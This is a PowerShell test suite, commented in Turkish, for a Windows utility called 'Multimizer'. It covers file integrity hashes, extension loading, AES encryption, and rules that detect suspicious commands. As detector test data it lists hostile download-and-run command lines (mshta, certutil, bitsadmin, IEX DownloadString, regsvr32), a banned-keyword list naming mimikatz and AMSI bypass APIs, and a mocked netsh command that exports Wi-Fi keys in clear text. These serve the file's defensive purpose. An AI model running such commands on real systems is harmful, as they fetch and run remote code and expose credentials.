. "$PSScriptRoot/lib.ps1"
Import-Fn 'Get-AppFolder', 'Get-TextSha256', 'Get-PackFileText', 'Get-ExtProblem', 'Test-AvBlockText', 'Import-MmExt', 'Get-ExtError', 'Get-SuspiciousCmdRegex', 'Get-OuiMap'
Import-Var 'PackHash', 'ExtOf', 'ExtState', 'SusRx', 'OuiMap', 'MmExtNames'

$script:Log = New-Object System.Collections.ArrayList
function Write-WhLog { param([string]$Text, [string]$Level = 'INFO') [void]$script:Log.Add($Level + '|' + $Text) }
function Log-Has([string]$Needle) { foreach ($l in $script:Log) { if ($l.Contains($Needle)) { return $true } }; return $false }

$realDir = $script:TestDir
$tmpRoot = Join-Path ([System.IO.Path]::GetTempPath()) ('mm-pack-' + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmpRoot -Force | Out-Null

function New-PackCopy([string]$Name) {
    $d = Join-Path $tmpRoot $Name
    New-Item -ItemType Directory -Path $d -Force | Out-Null
    foreach ($sub in 'veri', 'Eklenti') { Copy-Item -LiteralPath (Join-Path $realDir $sub) -Destination $d -Recurse -Force }
    [System.IO.File]::WriteAllText((Join-Path $d 'Multimizer.ps1'), '# yer tutucu')
    return $d
}
function Use-Dir([string]$Dir) {
    $script:sync = @{ ScriptPath = (Join-Path $Dir 'Multimizer.ps1') }
    $script:ExtState = @{}
    $script:SusRx = $null
    $script:OuiMap = $null
    $script:Log.Clear()
}

try {
    # ======================= 1) yan dosyalar ve ozetler =======================
    $sync = @{ ScriptPath = $script:TestPath }
    Assert-Eq (Get-AppFolder) $realDir 'betik klasoru'
    foreach ($rel in @($script:PackHash.Keys)) {
        $r = Get-PackFileText $rel
        Assert-True ($r.Ok -eq $true) ('ozet tutar: ' + $rel + ' ' + $r.Error)
    }
    Assert-True ($script:PackHash.Count -ge 5) ('en az bes yan dosya: ' + $script:PackHash.Count)
    # diskteki her yan dosya betikte kayitli olmali (kayitsiz dosya yuklenmez)
    $onDisk = New-Object System.Collections.ArrayList
    foreach ($sub in 'veri', 'Eklenti') {
        $base = Join-Path $realDir $sub
        foreach ($f in @(Get-ChildItem -LiteralPath $base -File -Recurse)) { [void]$onDisk.Add($sub + '/' + $f.FullName.Substring($base.Length + 1).Replace('\', '/')) }
    }
    foreach ($rel in $onDisk) { Assert-True ($script:PackHash.ContainsKey($rel)) ('diskteki dosya kayitli: ' + $rel) }
    Assert-Eq $onDisk.Count $script:PackHash.Count 'kayitli dosya sayisi diskle ayni'
    Assert-Eq (Get-TextSha256 'abc') 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad' 'SHA-256 bilinen deger'

    # ---- dosya yok
    $d1 = New-PackCopy 'eksik'
    Remove-Item -LiteralPath (Join-Path $d1 'Eklenti') -Recurse -Force
    Use-Dir $d1
    $r = Get-PackFileText 'Eklenti/Sifreleme.ps1'
    Assert-Eq $r.Ok $false 'eksik eklenti: Ok=false'
    Assert-Eq $r.Kind 'missing' 'eksik eklenti: Kind'
    Assert-True ($r.Error -like '*ZIP*') 'eksik eklenti: ZIP uyarisi'
    Assert-True ((Get-ExtProblem 'Sifreleme') -ne '') 'Get-ExtProblem sorun bildirir'
    $x = Import-MmExt 'Sifreleme'
    Assert-Eq $x.Ok $false 'eksik eklenti yuklenmez'
    Assert-Eq $x.Blocked $false 'eksik eklenti engellenmis sayilmaz'
    Assert-True ((Get-ExtError 'Job_Crypt') -ne '') 'Get-ExtError eksik eklentiyi soyler'
    Assert-Eq (Get-ExtError 'Job_Priority') '' 'eklentisiz is icin hata yok'
    Assert-True ((Get-OuiMap).Count -gt 30000) 'veri klasoru varken OUI yuklenir'

    # ---- dosya degistirilmis
    $d2 = New-PackCopy 'bozuk'
    $p = Join-Path $d2 'Eklenti/Bellek.ps1'
    [System.IO.File]::AppendAllText($p, "`r`n# izinsiz ekleme`r`n")
    Use-Dir $d2
    $r = Get-PackFileText 'Eklenti/Bellek.ps1'
    Assert-Eq $r.Ok $false 'degistirilmis eklenti reddedilir'
    Assert-Eq $r.Kind 'hash' 'degistirilmis eklenti: Kind=hash'
    $x = Import-MmExt 'Bellek'
    Assert-Eq $x.Ok $false 'degistirilmis eklenti yuklenmez'
    Assert-True (-not [bool](Get-Command -Name 'Job_MemTrim' -ErrorAction SilentlyContinue)) 'degistirilmis eklentinin islevi tanimlanmaz'
    $oui = Join-Path $d2 'veri/oui.txt'
    [System.IO.File]::AppendAllText($oui, "FFFFFF SAHTE`r`n")
    Use-Dir $d2
    $m = Get-OuiMap
    Assert-Eq $m.Count 0 'degistirilmis OUI dosyasi yuklenmez'
    Assert-True (Log-Has 'Üretici tablosu') 'OUI sorunu gunluge yazilir'

    # ---- satir sonu ve BOM farki ozeti bozmaz
    $d3 = New-PackCopy 'satirsonu'
    foreach ($rel in 'veri/oui.txt', 'veri/supheli-komutlar.txt', 'Eklenti/WifiAktar.ps1') {
        $fp = Join-Path $d3 $rel
        $raw = [System.IO.File]::ReadAllText($fp, [System.Text.Encoding]::UTF8).Replace("`r`n", "`n")
        [System.IO.File]::WriteAllText($fp, $raw, (New-Object System.Text.UTF8Encoding($false)))
    }
    $fp = Join-Path $d3 'Eklenti/Bellek.ps1'
    $raw = [System.IO.File]::ReadAllText($fp, [System.Text.Encoding]::UTF8)
    [System.IO.File]::WriteAllText($fp, $raw, (New-Object System.Text.UTF8Encoding($true)))
    Use-Dir $d3
    foreach ($rel in 'veri/oui.txt', 'veri/supheli-komutlar.txt', 'Eklenti/WifiAktar.ps1', 'Eklenti/Bellek.ps1') {
        $r = Get-PackFileText $rel
        Assert-True ($r.Ok -eq $true) ('LF/BOM farki ozeti bozmaz: ' + $rel)
    }

    # ======================= 2) engelleme metni tanima =======================
    Assert-True (Test-AvBlockText 'This script contains malicious content and has been blocked by your antivirus software.') 'Ingilizce engel metni'
    Assert-True (Test-AvBlockText 'ScriptContainedMaliciousContent') 'hata kimligi'
    Assert-True (Test-AvBlockText ('Bu betik k' + [char]0x00F6 + 't' + [char]0x00FC + ' ama' + [char]0x00E7 + 'l' + [char]0x0131 + ' i' + [char]0x00E7 + 'erik; vir' + [char]0x00FC + 's korumas' + [char]0x0131 + ' engelledi')) 'Turkce engel metni'
    Assert-True (-not (Test-AvBlockText 'Ge' + [char]0x00E7 + 'ersiz s' + [char]0x00F6 + 'zdizimi: beklenmeyen )')) 'sozdizimi hatasi engel sayilmaz'

    # ======================= 3) yukleyici =======================
    Use-Dir $realDir
    $sync = @{ ScriptPath = $script:TestPath }
    $script:ExtState = @{}
    $script:Log.Clear()
    Assert-Eq (Get-ExtError 'Job_Crypt') '' 'saglam dosyalarla Job_Crypt eklentisi yuklenir'
    Assert-True ([bool](Get-Command -Name 'Job_Crypt' -ErrorAction SilentlyContinue)) 'Job_Crypt tanimli'
    Assert-True ([bool](Get-Command -Name 'Protect-FileAes' -ErrorAction SilentlyContinue)) 'Protect-FileAes tanimli'
    Assert-True ($script:ExtState.ContainsKey('Sifreleme')) 'sonuc oturumda saklanir'
    Assert-Eq (Get-ExtError 'Job_Crypt') '' 'ikinci cagri da tamam (onbellek)'
    Assert-Eq (Get-ExtError 'Job_MemTrim') '' 'Bellek eklentisi yuklenir'
    Assert-True ([bool](Get-Command -Name 'Initialize-MemNative' -ErrorAction SilentlyContinue)) 'Initialize-MemNative tanimli'
    Assert-True ([bool](Get-Command -Name 'Job_MemTrim' -ErrorAction SilentlyContinue)) 'Job_MemTrim tanimli'
    Assert-Eq $script:ExtOf['Job_SecureDelete'] 'GuvenliSilme' 'Job_SecureDelete eklentiye bagli'
    Assert-Eq (Get-ExtError 'Job_SecureDelete') '' 'GuvenliSilme eklentisi yuklenir'
    Assert-True ([bool](Get-Command -Name 'Remove-FileSecure' -ErrorAction SilentlyContinue)) 'Remove-FileSecure tanimli'
    Assert-True ([bool](Get-Command -Name 'Job_SecureDelete' -ErrorAction SilentlyContinue)) 'Job_SecureDelete tanimli'
    $x = Import-MmExt 'WifiAktar'
    Assert-Eq $x.Ok $true 'WifiAktar yuklenir'
    # Wi-Fi: dogru komut ve klasor
    $script:NativeArgs = $null
    function Invoke-Native { param([string]$Exe, $ArgList) $script:NativeArgs = @($Exe) + @($ArgList); return 0 }
    $code = Export-WifiProfilesWithKeys 'C:\Kit\WiFi'
    Assert-Eq $code 0 'Wi-Fi disa aktarma cikis kodu'
    Assert-Eq ($script:NativeArgs -join ' ') 'netsh.exe wlan export profile key=clear folder=C:\Kit\WiFi' 'Wi-Fi komut satiri'

    # sozdizimi hatali ama ozeti kayitli eklenti: yuklenmez, "engellendi" denmez
    $d4 = New-PackCopy 'sozdizimi'
    $badText = "function global:Job_Bozuk {`r`n  if (`r`n"
    [System.IO.File]::WriteAllText((Join-Path $d4 'Eklenti/Bozuk.ps1'), $badText, (New-Object System.Text.UTF8Encoding($false)))
    Use-Dir $d4
    $script:PackHash['Eklenti/Bozuk.ps1'] = (Get-TextSha256 ($badText.Replace("`r`n", "`n")))
    $x = Import-MmExt 'Bozuk'
    Assert-Eq $x.Ok $false 'sozdizimi hatali eklenti yuklenmez'
    Assert-Eq $x.Blocked $false 'sozdizimi hatasi engel sayilmaz'
    Assert-True ($x.Error -like 'Eklenti y*klenemedi*') 'sozdizimi hatasi metni'
    $script:PackHash.Remove('Eklenti/Bozuk.ps1')

    # ======================= 4) sifreleme gidis-donus =======================
    Use-Dir $realDir
    $sync = @{ ScriptPath = $script:TestPath }
    Assert-Eq (Get-ExtError 'Job_Crypt') '' 'sifreleme eklentisi hazir'
    function Set-JobProgress { param($a, $b, $c) }
    function Step-JobProgress { }
    function Test-JobCancel { return $false }
    $work = Join-Path $tmpRoot 'sifre'
    New-Item -ItemType Directory -Path $work -Force | Out-Null
    $plain = Join-Path $work 'not.txt'
    $content = ('Multimizer deneme ' * 5000) + [char]0x00E7 + [char]0x011F + [char]0x0131 + [char]0x00F6 + [char]0x015F + [char]0x00FC
    [System.IO.File]::WriteAllText($plain, $content, (New-Object System.Text.UTF8Encoding($false)))
    $log0 = $script:Log.Count
    $r = Job_Crypt @{ Mode = 'Enc'; Paths = @($plain); Password = 'Parola-12345' }
    Assert-Eq $r.Ok $true 'sifreleme basarili'
    $enc = [string]@($r.Outputs)[0]
    Assert-True ($enc.EndsWith('.mmz')) 'uzanti .mmz'
    Assert-True (Test-Path -LiteralPath $plain) 'ozgun dosya silinmez'
    $encBytes = [System.IO.File]::ReadAllBytes($enc)
    Assert-Eq ([System.Text.Encoding]::ASCII.GetString($encBytes, 0, 4)) 'MMZ1' 'baslik MMZ1'
    Assert-True ($encBytes.Length -gt ([System.Text.Encoding]::UTF8.GetByteCount($content))) 'sifreli dosya acik metinden uzun (basliklar + etiket)'
    $txtBytes = [System.Text.Encoding]::UTF8.GetBytes('Multimizer deneme')
    $found = $false
    for ($i = 0; $i -lt ($encBytes.Length - $txtBytes.Length); $i++) { if ($encBytes[$i] -eq $txtBytes[0] -and $encBytes[$i + 1] -eq $txtBytes[1] -and $encBytes[$i + 2] -eq $txtBytes[2] -and $encBytes[$i + 3] -eq $txtBytes[3]) { $found = $true; break } }
    Assert-True (-not $found) 'sifreli dosyada acik metin gorunmez'
    Remove-Item -LiteralPath $plain -Force
    $r2 = Job_Crypt @{ Mode = 'Dec'; Paths = @($enc); Password = 'Parola-12345' }
    Assert-Eq $r2.Ok $true 'cozme basarili'
    $dec = [string]@($r2.Outputs)[0]
    Assert-Eq ([System.IO.File]::ReadAllText($dec, [System.Text.Encoding]::UTF8)) $content 'cozulen icerik ayni'
    $r3 = Job_Crypt @{ Mode = 'Dec'; Paths = @($enc); Password = 'Yanlis-parola1' }
    Assert-Eq $r3.Ok $false 'yanlis parola reddedilir'
    Assert-True (@(Get-ChildItem -LiteralPath $work -Filter '*.yaziliyor').Count -eq 0) 'yarim kalan gecici dosya birakilmaz'
    $r4 = Job_Crypt @{ Mode = 'Enc'; Paths = @($dec); Password = 'kisa' }
    Assert-Eq $r4.Ok $false 'kisa parola reddedilir'
    # bozulmus dosya
    $bad = [System.IO.File]::ReadAllBytes($enc)
    $bad[60] = $bad[60] -bxor 1
    $badPath = Join-Path $work 'bozuk.mmz'
    [System.IO.File]::WriteAllBytes($badPath, $bad)
    $r5 = Job_Crypt @{ Mode = 'Dec'; Paths = @($badPath); Password = 'Parola-12345' }
    Assert-Eq $r5.Ok $false 'degistirilmis sifreli dosya reddedilir'
    Assert-True (-not (Log-Has 'Parola-12345')) 'parola gunluge yazilmaz'

    # PBKDF2-HMAC-SHA256 yedek surucu (eski .NET Framework icin): RFC 7914 test vektoru ve Rfc2898 ile ayni sonuc
    $extText = [System.IO.File]::ReadAllText((Join-Path $realDir 'Eklenti/Sifreleme.ps1'))
    $mm = [regex]::Match($extText, "(?s)Add-Type -TypeDefinition @'\r?\n(.*?)\r?\n'@")
    Assert-True $mm.Success 'yedek KDF kaynagi bulundu'
    Add-Type -TypeDefinition $mm.Groups[1].Value
    $dk = [MmKdf]::Derive([System.Text.Encoding]::UTF8.GetBytes('passwd'), [System.Text.Encoding]::UTF8.GetBytes('salt'), 1, 64)
    Assert-Eq (([System.BitConverter]::ToString($dk)).Replace('-', '').ToLowerInvariant()) '55ac046e56e3089fec1691c22544b605f94185216dde0465e68b9d57c20dacbc49ca9cccf179b645991664b39d77ef317c71b845b1e30bd509112041d3a19783' 'PBKDF2-SHA256 test vektoru'
    $salt16 = [byte[]](1..16)
    $viaFw = [MmKdf]::Derive([System.Text.Encoding]::UTF8.GetBytes('Parola-12345'), $salt16, 1500, 64)
    $viaNet = Get-Pbkdf2Sha256 'Parola-12345' $salt16 1500 64
    Assert-Eq ([System.BitConverter]::ToString($viaFw)) ([System.BitConverter]::ToString($viaNet)) 'yedek KDF, Rfc2898 ile ayni sonucu verir'

    # ======================= 5) supheli komut kurallari =======================
    Use-Dir $realDir
    $sync = @{ ScriptPath = $script:TestPath }
    $rx = Get-SuspiciousCmdRegex
    Assert-True ($rx.StartsWith('(?i)')) 'kural ifadesi buyuk/kucuk harf duyarsiz'
    $hit = @(
        'powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
        'powershell -w hidden -nop -c "x"',
        'cmd /c mshta http://x.example/a.hta',
        'certutil -urlcache -f http://x.example/a.exe a.exe',
        'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://x'')"',
        'bitsadmin /transfer j http://x a.exe',
        'regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll'
    )
    foreach ($h in $hit) { Assert-True ($h -match $rx) ('supheli komut yakalanir: ' + $h.Substring(0, [math]::Min(40, $h.Length))) }
    $ok = @(
        'C:\Windows\System32\cleanmgr.exe /sagerun:1',
        'C:\Program Files\Google\Update\GoogleUpdate.exe /ua /installsource scheduler',
        '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
        'powershell.exe -NoProfile -File C:\Scripts\yedek.ps1',
        'C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL'
    )
    foreach ($o in $ok) { Assert-True (-not ($o -match $rx)) ('zararsiz komut yakalanmaz: ' + $o.Substring(0, [math]::Min(40, $o.Length))) }
    # dosya yoksa kisitli yedek kural
    $d5 = New-PackCopy 'kuralyok'
    Remove-Item -LiteralPath (Join-Path $d5 'veri/supheli-komutlar.txt') -Force
    Use-Dir $d5
    $rx2 = Get-SuspiciousCmdRegex
    Assert-True ('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdA==' -match $rx2) 'yedek kural kodlanmis komutu yakalar'
    Assert-True (-not ('cmd /c mshta http://x' -match $rx2)) 'yedek kural yalnizca kodlanmis komutu arar'
    Assert-True (Log-Has 'kısıtlı kural') 'kisitli kural gunluge yazilir'
    # kurallarin degistirilmis hali kullanilmaz
    $d6 = New-PackCopy 'kuralbozuk'
    [System.IO.File]::AppendAllText((Join-Path $d6 'veri/supheli-komutlar.txt'), "notepad\r\n")
    Use-Dir $d6
    $rx3 = Get-SuspiciousCmdRegex
    Assert-True (-not ('notepad.exe a.txt' -match $rx3)) 'degistirilmis kural dosyasi uygulanmaz'

    # ======================= 6) ana betik riskli kalip tasimaz =======================
    $src = [System.IO.File]::ReadAllText($script:TestPath)
    $banned = @('H4sI', 'GZipStream', 'DeflateStream', 'key=clear', 'CreateEncryptor', 'CreateDecryptor', 'EmptyWorkingSet', 'NtSetSystemInformation',
        'AdjustTokenPrivileges', 'OpenProcessToken', 'DownloadString', 'DownloadFile', 'Invoke-Expression', 'mimikatz', 'Rfc2898', 'SeDebugPrivilege',
        'VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 'AmsiScanBuffer', 'amsiInitFailed', 'Reflection.Assembly',
        'RandomNumberGenerator', 'RNGCryptoServiceProvider')
    foreach ($w in $banned) { Assert-True ($src.IndexOf($w, [StringComparison]::OrdinalIgnoreCase) -lt 0) ('ana betikte yok: ' + $w) }
    Assert-True (([regex]::Matches($src, 'FromBase64String')).Count -le 1) 'FromBase64String en fazla bir kez (anahtar uzunlugu denetimi)'
    Assert-True (-not [regex]::IsMatch($src, '[A-Za-z0-9+/=]{200,}')) 'ana betikte 200+ karakterlik base64 benzeri dizi yok'
    $maxLine = 0
    foreach ($ln in ($src -split "`n")) { if ($ln.Length -gt $maxLine) { $maxLine = $ln.Length } }
    Assert-True ($maxLine -lt 20000) ('en uzun satir makul: ' + $maxLine)
    # 3,6 MB: 10.1.0 çeviri ve ekran okuyucu / dokunma hedefleri eklerinden sonra 3,7 MB'a çıkarıldı (kod ve XAML büyümesi; base64 / uzun satır denetimleri ayrı)
    Assert-True ($src.Length -lt 3700000) ('ana betik boyutu: ' + $src.Length)
    # eklentiler ve ana betik birbirine baglanir
    Assert-True ($src.Contains('Get-ExtError $Entry')) 'is calistirici eklentiyi yukler'
    Assert-True ($src.Contains("foreach (`$sub in @('veri', 'Eklenti'))")) 'kurulum yan klasorleri de kopyalar'
    $ext = [System.IO.File]::ReadAllText((Join-Path $realDir 'Eklenti/Sifreleme.ps1'))
    Assert-True ($ext.Contains('CreateEncryptor')) 'sifreleme kodu eklentide'
    Assert-True ($ext -notmatch '\$script:') 'eklenti betik kapsamli degisken kullanmaz'
    foreach ($f in @(Get-ChildItem -LiteralPath (Join-Path $realDir 'Eklenti') -Filter '*.ps1')) {
        $t = [System.IO.File]::ReadAllText($f.FullName)
        $m = [regex]::Matches($t, '(?m)^function (?!global:)')
        Assert-Eq $m.Count 0 ('eklentideki her islev global: ile tanimli: ' + $f.Name)
    }

    # ======================= 6b) arka plan calisma alani: eklenti isi calistiran runspace'te yuklenir ve sonraki cagrilarda durur =======================
    $fnTexts = New-Object System.Collections.ArrayList
    foreach ($n in @('Get-AppFolder', 'Get-TextSha256', 'Get-PackFileText', 'Get-ExtProblem', 'Test-AvBlockText', 'Import-MmExt', 'Get-ExtError')) {
        $f = @(Get-AstFunctions | Where-Object { $_.Name -eq $n }) | Select-Object -Last 1
        [void]$fnTexts.Add($f.Extent.Text)
    }
    $rs = [runspacefactory]::CreateRunspace()
    $rs.Open()
    try {
        $rs.SessionStateProxy.SetVariable('PackHashIn', $script:PackHash)
        $rs.SessionStateProxy.SetVariable('ExtOfIn', $script:ExtOf)
        $rs.SessionStateProxy.SetVariable('ScriptPathIn', $script:TestPath)
        $init = ($fnTexts -join "`n") + "`n" + '$script:PackHash = $PackHashIn; $script:ExtOf = $ExtOfIn; $script:ExtState = @{}; $sync = @{ ScriptPath = $ScriptPathIn }; function Write-WhLog { param($Text, $Level) }'
        $ps1 = [powershell]::Create(); $ps1.Runspace = $rs
        [void]$ps1.AddScript($init)
        [void]$ps1.AddScript("Get-ExtError 'Job_SecureDelete'")
        $o1 = @($ps1.Invoke())
        Assert-True ($ps1.Streams.Error.Count -eq 0) ('runspace: yukleme hatasiz ' + (($ps1.Streams.Error | ForEach-Object { [string]$_ }) -join '; '))
        Assert-Eq ([string]($o1 | Select-Object -Last 1)) '' 'runspace: Get-ExtError bos (eklenti yuklendi)'
        $ps1.Dispose()
        # ayri bir cagrida (Wrapper'in & $Entry $P yaptigi gibi) islev hala tanimli olmali
        $victim = Join-Path $tmpRoot 'kurban.bin'
        [System.IO.File]::WriteAllBytes($victim, (New-Object byte[] 4096))
        $rs.SessionStateProxy.SetVariable('VictimIn', $victim)
        $ps2 = [powershell]::Create(); $ps2.Runspace = $rs
        [void]$ps2.AddScript('$e1 = [bool](Get-Command -Name "Remove-FileSecure" -ErrorAction SilentlyContinue); $e2 = [bool](Get-Command -Name "Job_SecureDelete" -ErrorAction SilentlyContinue); $len = Remove-FileSecure $VictimIn; @($e1, $e2, $len)')
        $o2 = @($ps2.Invoke())
        Assert-True ($ps2.Streams.Error.Count -eq 0) ('runspace: ikinci cagri hatasiz ' + (($ps2.Streams.Error | ForEach-Object { [string]$_ }) -join '; '))
        Assert-True ($o2.Count -ge 3 -and $o2[0] -eq $true -and $o2[1] -eq $true) 'runspace: eklenti islevleri sonraki cagrida tanimli'
        Assert-True (-not (Test-Path -LiteralPath $victim)) 'runspace: dosya eklenti islevi ile silindi'
        $ps2.Dispose()
    } finally { $rs.Dispose() }

    # ======================= 7) -OzTest adimlari (gercek govdeleriyle) =======================
    $tk = $null; $er = $null
    $past = [System.Management.Automation.Language.Parser]::ParseFile($script:TestPath, [ref]$tk, [ref]$er)
    $stepCmds = $past.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $n.GetCommandName() -eq 'Test-Step' }, $true)
    function Get-StepBlock([string]$Needle) {
        foreach ($c in $stepCmds) {
            if ($c.CommandElements[1].Extent.Text.Contains($Needle)) {
                foreach ($el in $c.CommandElements) { if ($el -is [System.Management.Automation.Language.ScriptBlockExpressionAst]) { return [scriptblock]::Create($el.ScriptBlock.Extent.Text.Trim().TrimStart('{').TrimEnd('}')) } }
            }
        }
        return $null
    }
    function Invoke-Step([string]$Needle) {
        $b = Get-StepBlock $Needle
        if ($null -eq $b) { return ('ADIM YOK: ' + $Needle) }
        $o = @(& $b)
        if ($o.Count -gt 0) { return $o[$o.Count - 1] }
        return $null
    }
    $needleFiles = 'eklenti dosyalar'
    $needleOui = 'tablosu (OUI)'
    $needleExt = 'Eklentiler y'
    Assert-True ($null -ne (Get-StepBlock $needleFiles)) 'adim var: veri ve eklenti dosyalari'
    Assert-True ($null -ne (Get-StepBlock $needleOui)) 'adim var: OUI tablosu'
    Assert-True ($null -ne (Get-StepBlock $needleExt)) 'adim var: eklentiler yuklenir'
    # saglam paket: uc adim da basarili (bos/null = basarili)
    Use-Dir $realDir
    Assert-True ($null -eq (Invoke-Step $needleFiles)) 'saglam paket: dosyalar adimi basarili'
    Assert-True ($null -eq (Invoke-Step $needleOui)) 'saglam paket: OUI adimi basarili'
    Assert-True ($null -eq (Invoke-Step $needleExt)) 'saglam paket: eklentiler adimi basarili'
    # bozulmus eklenti: dosya adimi dosyayi adiyla bildirir, yukleme adimi hata verir
    $dBad = New-PackCopy 'ozbozuk'
    [System.IO.File]::AppendAllText((Join-Path $dBad 'Eklenti/Bellek.ps1'), "`n# oynandi")
    Use-Dir $dBad
    $r1 = Invoke-Step $needleFiles
    Assert-True (($r1 -is [string]) -and $r1.Contains('Bellek.ps1')) ('bozulan dosya adla bildirilir: ' + [string]$r1)
    Assert-True (($r1 -is [string]) -and $r1.Contains('ZIP')) 'cozum onerisi: ZIP dosyasinin tamamini cikartin'
    $r2 = Invoke-Step $needleExt
    Assert-True (($r2 -is [string]) -and $r2.Contains('Bellek')) ('yukleme adimi bozuk eklentiyi bildirir: ' + [string]$r2)
    # eksik OUI: adim uyari metni dondurur (uygulama yine acilir; adim WarnOnly)
    $dNoOui = New-PackCopy 'ozoui'
    Remove-Item -LiteralPath (Join-Path $dNoOui 'veri/oui.txt') -Force
    Use-Dir $dNoOui
    $r3 = Invoke-Step $needleOui
    Assert-True (($r3 -is [string]) -and $r3 -ne '') ('eksik OUI tablosu bildirilir: ' + [string]$r3)
    # uc adim da WarnOnly ($true): eksik yan dosya uygulamayi bozuk gostermemeli
    foreach ($n in @($needleFiles, $needleOui, $needleExt)) {
        foreach ($c in $stepCmds) {
            if ($c.CommandElements[1].Extent.Text.Contains($n)) {
                $last = $c.CommandElements[$c.CommandElements.Count - 1].Extent.Text
                Assert-Eq $last '$true' ('adim yalnizca UYARI verir: ' + $n)
            }
        }
    }
} finally {
    try { Remove-Item -LiteralPath $tmpRoot -Recurse -Force -ErrorAction SilentlyContinue } catch { }
}
Show-Result
